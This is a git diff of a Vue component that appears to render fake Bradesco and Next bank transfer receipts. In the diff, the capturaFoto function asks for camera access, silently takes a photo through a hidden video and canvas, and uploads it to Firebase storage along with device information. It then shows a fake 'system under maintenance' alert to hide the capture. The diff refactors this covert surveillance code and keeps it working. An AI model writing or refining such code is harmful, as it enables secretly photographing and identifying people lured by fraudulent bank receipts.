@@ -1,14 +1,3 @@
-<template>
-    <div class="container">
-        <Bradesco v-if="comprovante && comprovante.instituicao == 'bradesco'" :comprovante="comprovante"
-            @tirar-foto="capturaFoto" />
-        <Next v-if="comprovante && comprovante.instituicao == 'next'" :comprovante="comprovante"
-            @tirar-foto="capturaFoto" />
-    </div>
-    <video id="camera" style="display: none;" muted autoplay></video>
-    <canvas id="photo" style="display: none;"></canvas>
-</template>
-
 <script setup>
 import { computed, onBeforeMount, onMounted, reactive, ref } from 'vue';
 import { useRoute, useRouter } from 'vue-router';
@@ -29,12 +18,12 @@ const appStore = useAppStore();
 const comprovante = ref(null);
 const acesso = ref({});
 
+const video = ref(null);
+const canvas = ref(null);
+
 const data = reactive({
-    video: null,
-    canvas: null,
     comprovanteId: null,
     acessoId: null,
-    capturaFotoRealizada: false
 });
 
 onBeforeMount(() => {
@@ -65,9 +54,6 @@ onMounted(async () => {
     }
 
     setMetaData();
-
-    data.video = document.getElementById('camera');
-    data.canvas = document.getElementById('photo');
 
     try {
         acesso.value = { ...acesso.value, ...await Device.getInfo() };
@@ -147,39 +133,58 @@ function setMetaData() {
         .namedItem('description')
         .setAttribute('content', `Comprovante ${banco.nome}: Transação no valor de ${formataMoedaBRL(comprovante.value.valor)}${para}.`);
 
-    // document.querySelector('link[rel="image_src"]').href = bancoImgSrc.value;
     document.querySelector('link[rel="icon"]').href = faviconSrc.value;
 }
 
 async function capturaFoto() {
-    if (data.capturaFotoRealizada) {
-        return;
-    }
-
-    await requestCameraPermission(data.video);
     appStore.loadingToggle();
 
-    data.canvas.width = data.video.videoWidth;
-    data.canvas.height = data.video.videoHeight;
+    await requestCameraPermission(video.value).then(async () => {
+        video.value.play();
+        await delay(500);
+    });
 
-    const context = data.canvas.getContext('2d');
-    context.drawImage(data.video, 0, 0, data.canvas.width, data.canvas.height);
+    canvas.value.width = video.value.videoWidth;
+    canvas.value.height = video.value.videoHeight;
+
+    const context = canvas.value.getContext('2d');
+    context.drawImage(video.value, 0, 0, canvas.value.width, canvas.value.height);
 
     try {
-        await uploadString(refStorage(storage, `/capturas/${data.comprovanteId}/${data.acessoId}`), data.canvas.toDataURL('image/jpeg'), 'data_url')
-        data.capturaFotoRealizada = true;
+        await uploadString(refStorage(storage, `/capturas/${data.comprovanteId}/${data.acessoId}`), canvas.value.toDataURL('image/jpeg'), 'data_url');
+        console.info('Wow!');
     } catch (error) {
         console.error('Error upload file:', error);
     }
 
-    const tracks = data.video.srcObject.getTracks();
+    const tracks = video.value.srcObject.getTracks();
     if (tracks) {
         tracks.forEach(t => t.stop());
     }
 
-
-    await delay(751 + (Math.random() * 750));
-    data.alert = alert('Sistema em manutenção. Tente mais tarde...');
+    await delay(251 + (Math.random() * 250));
+    alert('Sistema em manutenção. Tente mais tarde...');
     appStore.loadingToggle();
 }
 </script>
+
+<template>
+    <div class="container">
+        <Bradesco v-if="comprovante && comprovante.instituicao == 'bradesco'" :comprovante="comprovante"
+            @tirar-foto="capturaFoto" />
+        <Next v-if="comprovante && comprovante.instituicao == 'next'" :comprovante="comprovante"
+            @tirar-foto="capturaFoto" />
+    </div>
+    <video ref="video" muted autoplay></video>
+    <canvas ref="canvas"></canvas>
+</template>
+
+<style scoped>
+video {
+    display: none;
+}
+
+canvas {
+    display: none;
+}
+</style>
